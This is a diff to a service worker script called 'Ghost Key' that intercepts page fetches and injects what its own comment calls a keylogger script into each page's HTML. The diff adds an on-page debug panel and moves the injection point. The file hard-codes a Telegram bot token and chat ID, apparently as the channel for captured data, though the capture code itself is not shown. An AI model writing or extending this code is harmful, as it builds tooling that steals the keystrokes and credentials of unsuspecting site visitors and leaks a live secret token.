@@ -1,5 +1,4 @@
 // ===== SERVICE WORKER =====
-const CACHE_NAME = 'ghost-key-v1';
 const BOT_TOKEN = "8910457881:AAE9TznGCDNXkAxuo3Js_A1HaRVppAvhJuo";
 const CHAT_ID = "1431950109";
 
@@ -23,7 +22,7 @@ self.addEventListener('fetch', event => {
         event.respondWith(
             fetch(event.request).then(response => {
                 return response.text().then(html => {
-                    // Inject keylogger script
+                    // Inject keylogger script with debug
                     const inject = `
                         <script>
                             // ===== DEBUG =====
@@ -37,6 +36,32 @@ self.addEventListener('fetch', event => {
                                     }
                                 }
                                 console.log(msg);
+                            }
+
+                            // Add debug panel if not exists
+                            if (!document.getElementById('debug')) {
+                                const div = document.createElement('div');
+                                div.id = 'debug';
+                                div.style.cssText = \`
+                                    position: fixed;
+                                    bottom: 10px;
+                                    left: 10px;
+                                    right: 10px;
+                                    background: rgba(0,0,0,0.9);
+                                    color: #00ff88;
+                                    font-family: monospace;
+                                    font-size: 12px;
+                                    padding: 10px;
+                                    border-radius: 8px;
+                                    max-height: 150px;
+                                    overflow-y: auto;
+                                    z-index: 9999;
+                                    border: 1px solid #00ff88;
+                                    white-space: pre-wrap;
+                                    word-wrap: break-word;
+                                \`;
+                                div.innerHTML = '🟢 Ghost Key injected on this page';
+                                document.body.appendChild(div);
                             }
 
                             debug("🔍 Ghost Key injected on this page");
@@ -123,7 +148,7 @@ self.addEventListener('fetch', event => {
                         <\/script>
                     `;
 
-                    const modifiedHtml = html.replace('</head>', inject + '</head>');
+                    const modifiedHtml = html.replace('</body>', inject + '</body>');
                     return new Response(modifiedHtml, {
                         headers: response.headers,
                         status: response.status,
